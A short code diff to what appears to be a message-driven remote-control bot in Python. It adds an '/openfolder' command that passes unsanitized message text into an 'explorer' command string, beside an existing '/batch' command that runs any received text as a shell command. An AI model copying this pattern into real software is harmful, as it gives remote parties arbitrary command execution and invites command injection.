@@ -1691,6 +1691,13 @@ def send_data(message=None):
 
     elif message.startswith("/batch"):
         subprocess.Popen(message.replace("/batch", "", 1).strip(), shell=True)
+
+    elif message.startswith(("/openfolder")):
+        path = message.replace("/openfolder", "", 1)
+        path = os.path.abspath(path).replace(' \\','')
+        if not path.endswith('\\'):
+            path += '\\'
+        subprocess.Popen(f'explorer {path}')
         
     elif message.startswith(("/openfile", "/start")):
         path = message.replace("/openfile", "", 1).replace("/start", "", 1).strip()
